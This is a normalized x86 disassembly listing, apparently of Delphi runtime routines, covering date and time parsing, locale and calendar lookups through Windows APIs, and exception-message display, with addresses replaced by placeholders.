mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d2c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e50
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408ad4
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ad4
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
jmp r-xdata
sub_40a984
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a1d0
pop ecx
push ebp
mov eax ebx
call sub_40a1d0
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_40406c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40aa0c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40423c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40aa30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40aa0c
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40423c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40aac4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ab3d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab44
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40aa0c
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40423c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_40449c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40804c
test eax eax
jne r-xdata
mov eax edi
call sub_40423c
add [ esi ] eax
mov bl 0x1
sub_40ab50
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40aa0c
mov eax esi
call sub_40423c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40ab88
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40423c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40abd4
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40423c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c77c
mov [ ebx ] eax
jmp r-xdata
sub_40ac1c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40443c
push eax
mov eax [ ebx ]
call sub_40443c
pop edx
call sub_40c8f4
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ac70
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409df8
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40accc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40afe7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40ab88
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c830
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40aa30
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40abd4
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_40449c
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_4080bc
mov eax [ ebp - 0x1c ]
call sub_40ac1c
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40afee
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403fa0
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ab50
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40aa30
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ab50
test al al
je r-xdata
call sub_409df8
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40aa30
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409a18
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404580
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ab50
mov edx ebx
mov eax esi
call sub_40aa0c
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40423c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40abd4
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ac70
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40aa0c
mov eax esi
call sub_40423c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409df8
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40423c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40449c
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_40804c
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40423c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40449c
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_40804c
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40b010
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aac4
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aac4
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aac4
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40aa30
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40aa0c
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aac4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ab50
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40aa30
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aac4
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ab50
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40aa0c
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4098d0
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aac4
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40aa30
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aac4
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ab50
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aac4
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40aa30
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b204
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40accc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40423c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b238
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40b010
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40423c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b26c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40accc
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b238
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40423c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40b010
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b2f8
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_40406c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b344
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403fd0
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_40406c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b390
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b3b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b344
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405d64
sub_40b3f4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b507
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b3b8
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fd0
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b3b8
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fd0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b3b8
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403fd0
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b3b8
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403fd0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b50e
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fa0
retn
sub_40b518
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b554
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b5b9
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408334
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b5c0
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
inc ebx
sub_40b5cc
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b663
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b344
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408334
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b66a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b518
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b554
call EnumCalendarInfoA
sub_40b67c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b846
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f7c
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b344
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408334
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40423c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b84d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fa0
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408ad4
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c740
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_40449c
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404244
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403fd0
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408ad4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404244
inc ebx
jmp r-xdata
mov eax esi
call sub_40423c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408ad4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404244
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404244
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404244
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404164
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404244
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404164
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404244
sub_40b8b0
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b8a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c994
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4089f8
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_40529c
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_40313c
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409030
mov eax [ ebp - 0x4 ]
call sub_408968
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40443c
mov ebx eax
mov eax ebx
call sub_408968
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40ba38
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b8b0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_40529c
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402a84
call sub_4028d4
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408968
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40bb0c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fd0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bba2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_409070
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bba9
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
add esp 0xfffffff0
call sub_403550
sub_40bba9
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bbc8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405d64
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bc04
push ebp
